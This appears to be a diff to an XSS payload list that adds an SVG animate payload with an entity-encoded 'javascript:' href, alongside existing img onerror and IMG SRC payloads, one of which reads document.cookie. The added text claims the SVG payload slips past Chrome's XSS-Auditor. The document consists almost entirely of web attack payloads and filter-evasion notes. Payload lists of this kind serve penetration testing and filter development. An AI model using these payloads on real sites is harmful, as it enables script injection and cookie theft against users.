@@ -5,3 +5,4 @@
 
 <img src=x onerror="eval('alert(document.cookie)')"/>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>This payload injects a malicious script into an SVG element. The script sets the href attribute of the animate element to javascript:alert(1), which will execute the alert function when clicked. Since the script is injected into an SVG element, the Chrome XSS-Auditor fails to detect it.
